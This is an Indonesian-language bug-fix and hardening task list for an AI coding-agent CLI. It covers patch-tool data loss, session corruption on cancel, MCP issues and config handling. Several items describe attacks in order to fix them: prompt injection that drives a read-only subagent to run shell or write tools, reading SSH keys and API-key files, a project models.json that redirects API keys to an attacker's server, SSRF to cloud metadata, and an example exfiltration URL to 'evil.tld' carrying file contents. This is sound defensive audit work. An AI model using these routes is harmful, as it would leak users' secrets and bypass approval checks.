# TASK (RONDE 2): Bug tambahan & hardening di `vallen_cli/`

Dokumen ini **lanjutan** dari `VALLEN_CLI_BUGFIX_TASK.md` (ronde 1). Kerjakan ronde 1 dulu (atau sekaligus), lalu selesaikan yang ada di sini. Item yang beririsan dengan ronde 1 ditandai **[beririsan]**.

## Aturan kerja

- Ubah seminimal mungkin. **Jangan refactor** kode yang tidak terkait. Jangan menghapus fitur.
- Tiap fix P0 dan P1 **wajib** punya tes regresi (file baru `tests/test_round2_regressions.py` atau file tes yang relevan).
- Jalankan `pytest tests/` sebelum dan sesudah. Catat kegagalan pre-existing supaya tidak salah dianggap regresi.
- Legenda status bukti:
  - ✅ **Terbukti**: sudah direproduksi dengan menjalankan kodenya (skrip kecil).
  - 🔎 **Dari kode**: temuan dari membaca kode, belum dijalankan. **Verifikasi dulu** sebelum memperbaiki. Kalau ternyata tidak terbukti, lewati dan tulis alasannya.
- `pytest` belum pernah dijalankan oleh pembuat dokumen ini (dependensi tidak terpasang di sandbox). Semua verifikasi memakai skrip mandiri.

---

## P0 — Kritis (keamanan / kehilangan data / sesi rusak)

### R2-P0-1. Subagent menjalankan tool apa pun tanpa allowlist dan tanpa permission ✅(alur kode) **[beririsan dengan P0-1 ronde 1]**

- **File:** `vallen_cli/tools/task_tool.py` (`execute_subagent_tool`)
- **Gejala:** `allowed_names` hanya menyaring schema yang *diiklankan* ke model. Saat eksekusi, `tool_reg.execute(t_name, **args)` dipanggil langsung tanpa cek `t_name in allowed_names` dan tanpa `perm.guard`. Subagent "explore" (read-only) yang membaca file berisi prompt injection bisa memanggil `shell`, `write`, `tool_call`, atau tool MCP tanpa persetujuan, di workspace asli.
- **Fix:**
  1. Di `execute_subagent_tool`, tolak jika `t_name` (setelah resolve alias ke nama primer) tidak ada di `allowed_names`. Kembalikan error yang jelas ke model.
  2. Untuk tool mutasi (`edit`/`write`/`apply_patch`) pada subagent non-isolated, lewatkan `PermissionManager.guard` seperti agent utama.
  3. Tolak `tool_call` di subagent kecuali targetnya juga ada di `allowed_names`.
- **Tes:** subagent `explore` yang memanggil `shell` / `write` → ditolak dan tidak ada efek samping.

### R2-P0-2. Containment path mati saat belum ada project aktif ✅

- **File:** `vallen_cli/core/workspace.py` (`resolve_workspace_path`), `vallen_cli/tui/app.py` (`VallenApp.on_mount` mengeset `ws._active_project = None`)
- **Gejala:** Bila `active_project_path` kosong, `resolve_workspace_path` langsung `return p.resolve()` **tanpa cek containment**. TUI sengaja mulai tanpa project aktif, jadi pada kondisi awal `read`/`glob`/`grep` (semua `SAFE_TOOLS`, tanpa prompt) bisa membaca file mana pun (mis. `~/.ssh/id_rsa`, `~/.config/vallen/config.toml` yang berisi API key) dan isinya dikirim ke provider LLM.
- **Bukti:** dengan `ws._active_project=None`, `resolve_workspace_path("/etc/hosts")` → `/etc/hosts`.
- **Fix:**
  1. Saat tidak ada project aktif, pakai `os.getcwd()` sebagai root containment. Ini konsisten dengan `workspace_root()` yang sudah memakai cwd sebagai fallback.
  2. Tambahkan deny-list default untuk path sensitif (`~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.config/vallen/config.toml`, `.env*`) pada tool baca. Boleh di-override lewat config.
  3. Tulis `config.toml` dengan permission `0600` (lihat R2-P1-16).
- **Tes:** tanpa project aktif, `read` ke path di luar cwd → `PermissionError`/error rapi.

### R2-P0-3. `models.json` dari project bisa membelokkan provider (kebocoran API key) dan ikut tersimpan permanen ✅(alur kode)

- **File:** `vallen_cli/core/config.py` (`Config.load` auto-detect `.vallen/models.json`, `models.json` relatif ke **cwd**, lalu `Config.save`)
- **Gejala:**
  - File `models.json` di direktori kerja (nama generik, bisa milik project ML lain) otomatis di-merge ke konfigurasi.
  - Untuk provider yang bukan `openai`/`anthropic`/`gemini`/`ollama`, `prov_key = p_name` sehingga `base_url` **provider yang sudah ada** (yang API key-nya sudah diisi user) ditimpa ke URL dari repo. Repo berbahaya bisa mengarahkan trafik + API key ke server penyerang.
  - `Config.save()` menulis seluruh `_data` (termasuk hasil merge project) ke `~/.config/vallen/config.toml`, jadi pembelokan itu **menetap** di luar project tersebut.
- **Fix:**
  1. Jangan pernah menimpa `base_url`/`api_key` provider yang sudah ada dari file level-project. Project boleh menambah entri model baru saja, dengan `prov_key` berawalan khusus (mis. `project:<nama>`), tanpa mewarisi api_key provider lain.
  2. Simpan hasil merge project **terpisah** dari data yang dipersist. `save()` hanya menulis data dari file user + perubahan eksplisit.
  3. Hapus kandidat `Path("models.json")` yang generik (cukup `.vallen/models.json`), atau minta konfirmasi trust sekali per project.
- **Tes:** `models.json` di cwd dengan `apiBase` jahat untuk provider yang sudah ada → `base_url` tidak berubah, dan `save()` tidak menulis nilai dari project.

### R2-P0-4. `apply_patch`: korupsi & kehilangan data ✅

- **File:** `vallen_cli/tools/patch_tools.py`
- **Bug (semuanya terbukti dengan skrip):**
  1. **`*** Add File` menulis awalan `+` literal.** Deskripsi tool sendiri menyuruh model menulis tiap baris file baru dengan `+`, tetapi `flush()` tidak membuang awalan itu. Hasil: `hello.txt` berisi `+Hello world`. **Semua file baru lewat apply_patch rusak.**
  2. **`Add File` menimpa file yang sudah ada tanpa peringatan** (tanpa cek `exists`, tanpa read-before-write) → data lama hilang.
  3. **`Move to:` ke path yang sama menghapus file**: tulis ke `dest` lalu `p.unlink()` padahal `dest == p` → file hilang (direktori jadi kosong).
- **Fix:**
  1. Di `flush()` untuk `add`: buang tepat satu awalan `+` dari tiap baris (baris tanpa `+` dianggap error format, bukan konten). Pertahankan newline akhir.
  2. `Add File` pada path yang sudah ada → error ("file exists, gunakan Update File"), atau wajibkan read-before-write seperti `WriteTool` (`is_file_read` / `file_changed_since_read`).
  3. Saat move: kalau `dest.resolve() == p.resolve()` → abaikan move. Tolak overwrite `dest` yang sudah ada. Terapkan cek permission untuk `move_to` juga (sekarang hanya `h.path` yang dicek di `agent.py`).
- **Tes:** tiga skenario di atas (isi `hello.txt` harus `Hello world\n`, file lama tidak tertimpa, move same-path tidak menghapus).

### R2-P0-5. Cancel (Ctrl+H) memutus task di tengah tool → sesi tersimpan rusak + proses yatim ✅(alur kode) **[beririsan dengan P0-3, P1-2, P1-3 ronde 1]**

- **File:** `vallen_cli/tui/app.py` (`action_cancel_generation` memanggil `self._agent_task.cancel()`), `vallen_cli/core/agent.py`, `vallen_cli/tools/shell_tools.py` (`_run_command`), `vallen_cli/core/session.py`
- **Gejala:**
  - `task.cancel()` langsung menyuntikkan `CancelledError` di tengah pemrosesan tool. Pesan assistant dengan `tool_calls` sudah tersimpan ke DB, tetapi sebagian/seluruh tool result belum. Sesi **permanen rusak**: pesan berikutnya (dan setiap resume) kena error API "tool_call_id tanpa response".
  - `_run_command` hanya membunuh proses saat `TimeoutError`. Saat task dibatalkan, `wait_for(communicate())` dibatalkan tetapi proses shell **tetap hidup** (mis. `npm run dev`, build panjang).
- **Fix:**
  1. Cancel harus **kooperatif dulu**: set `cancel_event`, biarkan `run_agent` menyelesaikan invariant "tiap tool_call_id punya tepat satu result", baru task boleh dibatalkan dengan batas waktu (mis. 2 detik) sebagai jaring pengaman.
  2. `_run_command`: tangkap `asyncio.CancelledError` → bunuh process group (`SIGTERM` lalu `SIGKILL`) → `raise` ulang.
  3. **Sanitasi saat resume/load:** di `SessionManager.resume` (dan sebelum tiap request), lengkapi tool result yang hilang dengan pesan "cancelled/interrupted" atau buang assistant `tool_calls` yang tidak terjawab. Ini menyembuhkan sesi yang sudah rusak di DB pengguna.
  4. `_cmd_resume_session` dan `resume` juga harus `self._cached_system_prompt = None` (lihat R2-P1-9).
- **Tes:** simulasi cancel di tengah eksekusi 3 tool call → `get_api_messages()` valid, tidak ada proses `sleep` yang tersisa, dan sesi yang sengaja dirusak bisa di-resume tanpa error.

---

## P1 — Bug sedang (perilaku aneh yang dialami pengguna)

### R2-P1-1. Read-cache basi setelah formatter mengubah file → edit berikutnya ditolak ✅

- **File:** `vallen_cli/tools/file_tools.py` (`WriteTool`, `EditTool`)
- **Gejala:** `mark_file_read()` dipanggil **sebelum** `format_file()`. Bila formatter mengubah file (mtime/size berubah), cek `file_changed_since_read` menganggap file berubah di disk. Edit/write berikutnya gagal: "File changed on disk since last read. Read the file again". Agent buang satu ronde untuk `read` ulang, berulang di tiap edit.
- **Bukti:** dengan `format_file` yang mengubah `x=1`→`x = 1`, `write` sukses lalu `edit` langsung gagal.
- **Fix:** panggil `mark_file_read(str(p))` **setelah** format dan syntax check selesai (pada kedua tool, dan pada cabang hashline di `EditTool`).

### R2-P1-2. Auto-format terlalu agresif dan bisa menggantung ✅(bagian kode) / 🔎

- **File:** `vallen_cli/core/format.py`
- **Gejala:**
  - Formatter dijalankan di **setiap** write/edit, termasuk `.md`, `.yaml`, `.yml`, `.json`, tanpa peduli project memakainya. Hasilnya diff besar yang tidak diminta.
  - Fallback `npx prettier` bisa mengunduh paket atau menunggu prompt. `stdin` tidak di-`DEVNULL`, dan saat `wait_for(..., 10)` habis, proses **tidak dibunuh**. Tiap edit `.ts/.js/.md` menahan 10 detik dan meninggalkan proses yatim.
- **Fix:**
  1. Jalankan formatter hanya jika project mengonfigurasinya (mis. `[tool.ruff]`/`[tool.black]` di `pyproject.toml`, `.prettierrc*`/`prettier` di `package.json`, `rustfmt.toml`), atau jika `[format] enabled = true` di config. Default konservatif: nonaktif untuk `.md`/`.yaml`/`.json`.
  2. Untuk prettier, hanya pakai binary lokal (`node_modules/.bin/prettier`) atau `prettier` di PATH. **Jangan** pakai `npx` tanpa `--no-install`.
  3. `stdin=DEVNULL`, dan pada timeout: `proc.kill()` + `await proc.wait()`.

### R2-P1-3. Pengecekan sintaks memberi false positive ✅ (JSONC) / 🔎 (JS)

- **File:** `vallen_cli/core/format.py` (`check_file_syntax`)
- **Gejala:** File `tsconfig.json` (JSONC: komentar + trailing comma, valid untuk TypeScript) dilaporkan "JSON SyntaxError". Agent lalu "memperbaiki" file yang benar. `.js` berisi JSX/ESM tanpa `"type":"module"` juga bisa ditandai salah oleh `node --check`. Python yang memakai sintaks lebih baru dari interpreter CLI juga bisa salah terdeteksi.
- **Fix:** untuk `.json`, lewati file JSONC yang dikenal (`tsconfig*.json`, `jsconfig*.json`, `.eslintrc.json`, `.vscode/*.json`, `devcontainer.json`) atau coba parse dengan pengupas komentar/trailing comma dulu, dan hanya laporkan error jika keduanya gagal. Untuk `.js`, jangan laporkan error dari `node --check` kalau file mengandung JSX atau `import`/`export` dan package tidak bertipe module. Diagnostik sintaks hanya peringatan lunak, jangan menaikkan `verification_failures`.

### R2-P1-4. Doom loop terdeteksi tetapi turn tidak berhenti ✅(alur kode)

- **File:** `vallen_cli/core/agent.py`
- **Gejala:** Pesan bilang "Stopping agent turn", tetapi setelah `break` dari loop tool, kode tetap `tool_round += 1` dan `while` lanjut memanggil model lagi. Counter `failure_streak` tetap ≥ ambang, jadi kegagalan identik berikutnya memicu pesan lagi, terus sampai batas ronde (50).
- **Fix:** set flag `stop_turn = True` saat `doom_triggered`, jawab semua tool call tersisa, lalu keluar dari `while`. Boleh satu ronde terakhir tanpa tools supaya model menjelaskan ke pengguna.

### R2-P1-5. Timeout stream 180 detik berlaku untuk **seluruh** stream, bukan idle ✅(alur kode)

- **File:** `vallen_cli/core/agent.py` (`asyncio.timeout(PROVIDER_STREAM_TIMEOUT_SECONDS)` membungkus seluruh `async for`)
- **Gejala:** Jawaban panjang atau penulisan file besar yang wajar melebihi 180 detik dipotong walau token terus mengalir, lalu di-retry dari awal (menggandakan biaya dan teks; lihat P1-4 ronde 1).
- **Fix:** ganti dengan **idle timeout**: batas waktu antar-chunk (mis. 60–90 detik), di-reset tiap chunk masuk. Batas total opsional dan jauh lebih longgar, bisa diatur lewat config.

### R2-P1-6. HTTP 429 ditandai tidak bisa di-retry ✅(alur kode)

- **File:** `vallen_cli/providers/openai_compatible.py` (`non_retryable = ... 429`), `vallen_cli/core/error_classifier.py`
- **Gejala:** Provider menandai 429 `retryable=False`, sehingga `agent.py` langsung `break` sebelum classifier sempat menghitung backoff rate-limit (kodenya sudah ada tetapi tidak pernah tercapai).
- **Fix:** keluarkan 429 (dan 408, 409) dari daftar non-retryable. Baca header `Retry-After` dan teruskan ke `retryable`/delay. Perbaiki juga classifier yang mencari angka 4xx/5xx di sembarang teks error (mis. "…500 tokens…" salah dibaca sebagai HTTP 500). Utamakan `status_code` terstruktur.

### R2-P1-7. Parameter request tidak cocok untuk model tertentu 🔎

- **File:** `vallen_cli/providers/openai_compatible.py` (`_build_payload`), `vallen_cli/core/config.py` (default `max_tokens = 32768`)
- **Gejala:** Model reasoning OpenAI (o-series/gpt-5) menolak `max_tokens` dan `temperature` kustom. Banyak model menolak `max_tokens` di atas batasnya (default 32768 terlalu besar untuk mis. gpt-4o). Hasilnya 400 di setiap request.
- **Fix:** peta parameter per model/provider (`max_completion_tokens`, hilangkan `temperature`), dan/atau tangani 400 dengan pesan yang menyebut parameter bermasalah lalu retry sekali dengan parameter aman. Klem `max_tokens` ke batas model bila diketahui.

### R2-P1-8. Subagent: gagal diam-diam, hasil kacau, worktree bocor ✅(alur kode)

- **File:** `vallen_cli/tools/task_tool.py`
- **Bug:**
  1. Chunk `finish_reason == "error"` (rate limit, auth, timeout) tidak ditangani. Hasilnya `"(no output)"` dan status **completed / success=True**. Parent mengira tugas selesai.
  2. `final_text` mengakumulasi teks dari **semua** ronde (termasuk narasi "Let me read…"). Hasil akhir tercemar. Seharusnya hanya teks ronde terakhir.
  3. `max_sub_rounds = 5` dan `tools` selalu dikirim. Penjelajahan yang butuh >5 ronde berakhir tanpa ringkasan (`"(no output)"`). Agent utama sudah punya pola "ronde terakhir tanpa tools", subagent belum.
  4. `idx = tc.get("index", 0)` bisa `None` → `TypeError` (agent utama sudah menangani `None`). `t_id = tc.get("id", "")` bisa kosong → `tool_call_id` hilang → 400 (agent utama membuat id cadangan).
  5. Tidak ada `try/finally`: exception dari provider melewatkan `remove_worktree` (worktree + branch bocor), `_active_subagent_tasks` tidak dibersihkan, dan record task tetap "running".
- **Fix:** tangani error chunk (kembalikan `ToolResult(success=False, error=...)`), pakai teks ronde terakhir, naikkan batas ronde (mis. 12 untuk explore) dengan ronde terakhir tanpa tools, samakan penanganan `index`/`id` dengan agent utama, dan bungkus seluruh alur dengan `try/finally` (cleanup worktree, hapus dari registry, tandai `failed`/`cancelled`).

### R2-P1-9. `resume` tidak menyegarkan state → prompt & project salah ✅(alur kode)

- **File:** `vallen_cli/core/session.py` (`resume`), `vallen_cli/commands/processor.py` (`_cmd_resume_session`)
- **Gejala:**
  - `resume()` tidak mereset `_cached_system_prompt`, jadi sesi lama memakai prompt (path project, tree, `agents.md`) dari sesi sebelumnya.
  - Resume tidak memindahkan workspace ke `session["project"]`. Percakapan tentang project X, tetapi tool bekerja di project Y.
  - Pencocokan prefix ID mengambil yang pertama tanpa deteksi ambiguitas. Prefix kosong cocok dengan sesi terbaru.
  - `perm.reset()` **tidak pernah dipanggil** di mana pun. Approval "always" dan `ALWAYS_EDITS` bertahan lintas `/new`, `/cd`, dan resume.
  - `read cache` tidak dibersihkan saat resume.
- **Fix:** di `resume`, kosongkan cache prompt + read cache, set project aktif sesuai sesi (bila direktorinya masih ada), dan panggil `get_permission_manager().reset()` pada `start_new`, `resume`, `/cd`, `/clear`. Tolak prefix yang ambigu atau kosong.

### R2-P1-10. Input biasa dibajak oleh parser perintah ✅

- **File:** `vallen_cli/commands/processor.py` (`process_input`, `_handle_file_ref`, `_cmd_cd`)
- **Bug (terbukti):**
  1. Pesan apa pun yang memuat "skill" **dan** salah satu dari `list`/`daftar`/`punya`/`apa aja` dijawab dengan daftar skill, tidak sampai ke AI. Pencocokan substring, jadi "checklist" dan "playlist" juga memicu. Contoh: "Tambahkan checklist untuk skill baru di README".
  2. Pesan berawalan `cd ` diperlakukan sebagai perintah `cd`: "cd ke folder src lalu buat file" → "Directory not found: `ke`". `cd Bob's stuff` → **`ValueError: No closing quotation`** tidak tertangkap. Path berspasi tanpa kutip terpotong di token pertama.
  3. `@token` diganti di mana saja: "Explain what @property does" menjadi "Explain what [File not found: property] does". Decorator (`@dataclass`, `@Injectable`) dan mention lain ikut terganti.
- **Fix:**
  1. Bungkus intent daftar-skill dengan aturan sempit: hanya pesan yang **pendek** dan cocok pola kata utuh (word boundary), atau pindahkan sepenuhnya ke `/skills`. Jangan mencegat kalimat panjang.
  2. `cd` hanya dikenali sebagai `/cd <path>` (atau `cd` bila argumennya adalah direktori yang benar-benar ada). Tangkap `ValueError` dari `shlex.split`, dukung path berspasi (`raw.partition(" ")[2]` dengan `strip` kutip).
  3. `@path` hanya diganti bila **file itu benar-benar ada**. Kalau tidak ada, biarkan teks apa adanya. Jangan menyisipkan "[File not found]".

### R2-P1-11. `!shell` cepat: stdin bocor, proses tidak dibunuh saat timeout 🔎

- **File:** `vallen_cli/commands/processor.py` (`_handle_shell`)
- **Gejala:** Subprocess mewarisi stdin terminal TUI (perintah interaktif seperti `python`, `git commit` tanpa `-m`, `ssh`, `sudo` bisa mengacaukan input Textual). Saat timeout 30 detik, `wait_for` membatalkan `communicate()` tetapi proses **tidak dibunuh** (`!npm run dev` jalan selamanya, tak terlihat).
- **Fix:** `stdin=DEVNULL`, `start_new_session=True`, dan pada timeout/cancel bunuh process group. Pakai ulang `_run_command` dari `shell_tools.py` supaya satu implementasi.

### R2-P1-12. Custom command: substitusi merusak data, `!` menjalankan teks biasa ✅

- **File:** `vallen_cli/core/custom_commands.py`
- **Bug (terbukti):**
  1. Setelah direktif shell diproses, `$ARGUMENTS` dan `$1..$9` diganti pada **seluruh** hasil, termasuk output perintah dan teks argumen pengguna. `/explain awk '{print $1}'` menjadi `awk '{print awk}'`. Output `git diff` yang memuat `$1` (regex, sed, awk, JS replace) dirusak diam-diam.
  2. Pola `^!\s*([^\n]+)` menjalankan **setiap** baris berawalan `!` sebagai shell, bahkan teks biasa: `!Penting: jangan lupa test` → `/bin/sh: Penting:: not found`. Direktif shell sebaiknya hanya `` !`cmd` `` (backtick).
  3. `subtask: false` di frontmatter dibaca sebagai string `'false'` yang truthy → mode subtask aktif. Parse boolean dengan benar.
  4. `subprocess.run(shell=True, timeout=15)` sinkron di event loop TUI → UI membeku sampai 15 detik per direktif, dan melewati permission manager. Command dari project (mis. hasil clone) menjalankan shell tanpa konfirmasi trust.
- **Fix:** substitusi dilakukan **satu kali** pada template sebelum menjalankan direktif (gunakan `re.sub` dengan satu fungsi callback yang menangani `$ARGUMENTS`/`$N` sekaligus), dan **jangan** substitusi ulang hasil direktif maupun argumen. Batasi direktif shell ke sintaks backtick. Jalankan lewat `asyncio` (non-blocking) dan minta konfirmasi trust sekali untuk command level-project yang mengandung direktif shell.

### R2-P1-13. MCP: klien mati permanen, alias tool bawaan dibajak, stall tiap turn ✅

- **File:** `vallen_cli/core/mcp.py`, `vallen_cli/core/permission.py`
- **Bug:**
  1. ✅ **Baris respons >64 KB membunuh klien.** `readline()` bawaan asyncio dibatasi 64 KiB. Hasil tool besar → `ValueError` → `except Exception: break` mengakhiri `_read_loop`. Semua request berikutnya menunggu 30 detik lalu timeout. **Terbukti:** respons 200 KB membuat panggilan itu dan panggilan sesudahnya gagal masing-masing 30 detik.
  2. 🔎 Satu baris non-JSON di stdout (log liar dari server) juga menghentikan `_read_loop`. Future yang menunggu tidak di-resolve.
  3. ✅ **Alias tool dibajak.** `McpProxyTool.aliases = [nama_asli]` didaftarkan ke registry. Server filesystem MCP resmi mengekspos `read_file`, `write_file`, `edit_file`, yang sama dengan alias tool bawaan. **Terbukti:** setelah register, `reg.get("read_file")` menjadi `McpProxyTool`. Tool bawaan (dengan containment, read-before-write, tracker) tergantikan oleh tool MCP tanpa itu semua.
  4. 🔎 Nama tool `mcp__{server}__{tool}` tidak disanitasi. API OpenAI mensyaratkan `^[a-zA-Z0-9_-]{1,64}$`. Nama server dengan titik/spasi atau nama panjang membuat **seluruh request** ditolak 400.
  5. 🔎 `initialize()` dipanggil di setiap `run_agent` dan server yang gagal start dicoba lagi tiap turn (hingga ~30 detik per server rusak) sebelum panggilan LLM. Tidak ada negative cache. `stderr=DEVNULL` menyembunyikan penyebabnya.
  6. 🔎 Tool MCP tidak masuk `SAFE_TOOLS` maupun `SENSITIVE_TOOLS`, jadi aturan "tool tak dikenal → ALLOW" meloloskannya tanpa persetujuan. Tool MCP yang menulis file atau menjalankan perintah berjalan tanpa prompt (dan di plan mode).
  7. 🔎 `stop_all()` hanya dipanggil dari `/mcp`, tidak saat quit. Tool proxy tidak dihapus dari registry saat server dihentikan/dihapus.
- **Fix:**
  1. `create_subprocess_exec(..., limit=32 * 1024 * 1024)`, dan `_read_loop` melewati baris non-JSON (log) alih-alih `break`. Jika loop benar-benar berakhir, resolve semua future tertunda dengan error.
  2. Jangan daftarkan alias polos bila bentrok dengan nama/alias yang sudah ada. Hanya nama ber-namespace.
  3. Sanitasi nama (`re.sub(r"[^a-zA-Z0-9_-]", "_", ...)`, potong 64 karakter, jaga keunikan).
  4. Negative cache + backoff untuk server gagal, inisialisasi paralel dengan timeout, jalankan di latar belakang, dan tampilkan error di event `info`.
  5. Perlakukan tool MCP sebagai default **ASK** (dengan opsi allow via config, mis. `"mcp__*" = "allow"`).
  6. Panggil `stop_all()` di `action_quit`, dan hapus tool proxy dari registry saat server dihentikan.

### R2-P1-14. Output tool terpotong secara merugikan ✅(alur kode)

- **File:** `vallen_cli/core/truncate.py`, `vallen_cli/core/loop/turn_tools.py`, `vallen_cli/tools/shell_tools.py`
- **Bug:**
  1. Output panjang di-*spill* ke `~/.config/vallen/truncation/…` dan model disuruh membacanya dengan `read`/`grep`. Tetapi path itu **di luar workspace**, jadi containment menolaknya. Petunjuknya tidak pernah bisa dijalankan. File spill juga tidak pernah dibersihkan dan bisa memuat rahasia (dump env, log) dengan permission default.
  2. Untuk `shell`, arah pemotongan `head`: **ekor output hilang**. Padahal ringkasan kegagalan `pytest`/build ada di akhir.
  3. Dua ambang bertabrakan: `truncate_output` (50 KB / 2000 baris) lalu `truncate_large_output` (25.000 karakter). Output 25–50 KB dipotong tanpa disimpan ke mana pun (data hilang) dengan petunjuk yang salah.
- **Fix:** simpan spill di dalam area yang boleh dibaca tool (mis. `<workspace>/.vallen/tmp/`, di-gitignore) atau beri `read` izin khusus untuk direktori spill. Bersihkan file >7 hari saat start. Untuk `shell` gunakan `direction="tail"` atau gabungan head+tail. Satukan ke satu ambang.

### R2-P1-15. `verify`: interpreter dan daftar file salah ✅(alur kode)

- **File:** `vallen_cli/tools/verify_tool.py`
- **Bug:**
  - Memakai `sys.executable` (Python milik CLI) untuk menjalankan `pytest`/`compileall` project. Dependensi project tidak ada sehingga verifikasi gagal terus, atau `No module named pytest`.
  - Fallback `compileall` mengumpulkan semua `*.py` kecuali `.venv`/`__pycache__`: folder `venv/`, `env/`, `site-packages`, `build/` ikut terbawa. Argumen bisa sangat panjang (`Argument list too long`).
  - Saat timeout hanya `process.kill()` (anak proses `npm test` yatim). `npm test` mode watch menggantung sampai timeout.
- **Fix:** pilih interpreter project (`<root>/.venv/bin/python`, `venv`, atau `python3` di PATH, bukan `sys.executable` CLI). Batasi/abaikan direktori umum (`venv`, `env`, `site-packages`, `build`, `dist`, `node_modules`) dan jalankan `compileall .` dengan `-x`. Buat process group baru dan bunuh seluruh group saat timeout. Set `CI=1` agar runner JS tidak masuk watch mode.

### R2-P1-16. Config: bisa menimpa konfigurasi user yang rusak, dan tidak aman ✅(alur kode)

- **File:** `vallen_cli/core/config.py`, `vallen_cli/providers/openai_compatible.py`, `vallen_cli/core/config.py` (`ProjectsDB`)
- **Bug:**
  1. Gagal parse TOML disembunyikan (`except Exception: pass`). Pemuatan lanjut dengan default, lalu `save()` berikutnya **menimpa file user yang sedang rusak** dengan konfigurasi default (kehilangan seluruh setelan). Pola sama di `ProjectsDB._load` (`projects.json` rusak → daftar project hilang saat save berikutnya).
  2. `save()` menulis tidak atomik dan dengan permission default (umumnya 0644) padahal berisi API key.
  3. `list_models()` dan `_try_auto_probe_local()` memanggil `cfg.load()` → **membuang perubahan in-memory yang belum disimpan** dan memicu merge ulang `models.json` (lihat R2-P0-3). Probe juga menyimpan pergantian port permanen hanya karena gangguan sesaat.
  4. `active_model`/`active_provider` menyimpan ke disk pada setiap set (tulis berulang, tidak atomik).
- **Fix:** kalau file ada tetapi gagal di-parse: **buat cadangan** (`config.toml.bak-<ts>`), beri peringatan jelas, dan jangan menimpa tanpa persetujuan. Tulis atomik (`tmp` + `os.replace`) dengan `chmod 0600`. Hindari `cfg.load()` di jalur biasa (baca ulang hanya lewat perintah eksplisit). Jangan persist hasil auto-probe port.

### R2-P1-17. Glob & scan_project gagal jika path project mengandung folder "build/dist/venv" ✅

- **File:** `vallen_cli/tools/agent_tools.py` (`GlobTool._scan`), `vallen_cli/core/workspace.py` (`scan_project`)
- **Gejala:** Filter ignore memeriksa `p.parts` dari path **absolut**. Project di `/home/u/build/myapp` (atau `~/dist/…`, `~/env/…`) membuat **semua** file terfilter. **Terbukti:** `glob("*.py")` di `.../build/myapp` → "No files matching", `scan_project()` → `[]`.
- **Fix:** hitung `p.relative_to(root).parts` untuk filter. Pada `glob`, jangan menelusuri isi direktori yang di-ignore sama sekali (pakai `os.walk` dengan pruning) alih-alih `Path.glob("**")` yang memasuki `node_modules`/`.git` lebih dulu baru difilter (lambat di repo besar).

### R2-P1-18. Mode headless: project dan sesi salah 🔎 **[beririsan dengan P1-5, P1-6 ronde 1]**

- **File:** `vallen_cli/core/headless.py`
- **Gejala:**
  - `elif not ws.active_project:` → project aktif yang **dipersist dari pemakaian terakhir** membuat CWD diabaikan. `vallencli run "…"` di direktori A bisa mengerjakan project B (terakhir dipakai) kecuali `-p` diberikan. Bila CWD tidak terdaftar, tidak ada project dan containment mati (R2-P0-2).
  - Tanpa `--session`, kode memakai `resume_last()`. Tiap `run` melanjutkan percakapan lama, sehingga riwayat menumpuk dan saling mencemari (buruk untuk CI/skrip).
- **Fix:** default: project = CWD (auto-register bila perlu), sesi **baru**. `--continue` untuk melanjutkan sesi terakhir, `--session <id>` untuk sesi tertentu.

### R2-P1-19. `webfetch`: SSRF, kebocoran lewat URL, memori 🔎

- **File:** `vallen_cli/tools/agent_tools.py` (`WebFetchTool`), `vallen_cli/core/permission.py`
- **Bug:**
  1. Tidak ada blokir alamat privat/loopback/link-local (`127.0.0.1`, `169.254.169.254`, `10.x`, `192.168.x`), termasuk setelah redirect. Model (atau prompt injection) bisa memanggil layanan lokal (server `serve` port 4096, 9router, metadata cloud). Hasilnya masuk ke konteks LLM.
  2. `webfetch`, `websearch`, `web_extract` ada di `SAFE_TOOLS` (tanpa prompt). URL yang dibuat model menjadi kanal eksfiltrasi tanpa persetujuan (`https://evil.tld/?d=<isi-file>`).
  3. `client.get(url)` membaca **seluruh** body ke memori, baru dipotong ke 2 MB. Respons multi-GB menghabiskan memori.
  4. Deskripsi menjanjikan "HTTP upgraded to HTTPS", tetapi kode tidak melakukannya (dokumentasi tidak cocok).
- **Fix:** resolve host dan tolak IP privat/loopback/link-local (cek ulang tiap hop redirect, batasi jumlah redirect). Streaming dengan batas ukuran (`client.stream`, hentikan di 2 MB). Ubah default permission `webfetch` ke ASK untuk domain yang belum di-allowlist (atau minimal tampilkan URL di prompt). Sesuaikan deskripsi dengan perilaku sebenarnya.

### R2-P1-20. Kompaksi dan estimasi token 🔎

- **File:** `vallen_cli/core/token.py`, `vallen_cli/core/compact.py`
- **Bug:**
  1. `estimate_messages` melakukan `json.dumps` lalu `len//4`. Gambar base64 (`data:image/...`) dihitung sebagai teks: satu gambar 1 MB ≈ 250k "token" → overflow permanen, kompaksi terpicu di setiap ronde. Blok gambar tidak pernah dipangkas.
  2. Kompaksi menghapus semua pesan di DB lalu menulis ulang tanpa transaksi. Crash di tengah menghilangkan riwayat.
  3. Setelah kompaksi, urutan bisa menjadi `assistant(ack)` diikuti `assistant`, dan `recent` bisa kosong ketika 4 pesan terakhir semuanya `tool` (tugas yang sedang berjalan hilang dari konteks). Tolak provider yang ketat soal urutan role.
  4. Kompaksi yang gagal dicoba lagi di setiap ronde tanpa backoff.
- **Fix:** estimasi gambar dengan konstanta tetap (mis. ~1.500 token per gambar) dan pangkas blok gambar lama. Bungkus penulisan ulang DB dalam satu transaksi. Pertahankan pasangan `assistant(tool_calls)`+`tool` yang lengkap pada `recent`. Tambah backoff setelah kegagalan kompaksi.

### R2-P1-21. `apply_patch`: bug parser lain ✅

- **File:** `vallen_cli/tools/patch_tools.py`
- **Bug (terbukti):**
  1. `*** Update File` **tanpa `@@`** dilaporkan sukses (`M a.txt`) padahal **tidak ada perubahan** (baris `-`/`+` sebelum `@@` pertama dibuang). Model menganggap edit berhasil.
  2. Beberapa grup perubahan dalam satu hunk (dipisah baris konteks, format umum `git diff`) gagal: `removes` dari grup berbeda digabung menjadi blok yang tidak kontigu.
  3. Chunk hanya-tambah dengan hint (`@@ def foo():` + `+    new_line()`) **ditambahkan di akhir file**, bukan dekat hint.
  4. Chunk gagal tetap menulis **sebagian** hasil ke disk (dilaporkan `partial`) → file setengah terpatch.
  5. Tidak ada cek read-before-write / file berubah sejak dibaca (berbeda dari `write`/`edit`).
  6. Di `parse_unified_diff`, baris hapus berawalan `-- ` (komentar SQL) tampil sebagai `--- ` dan dianggap header file baru.
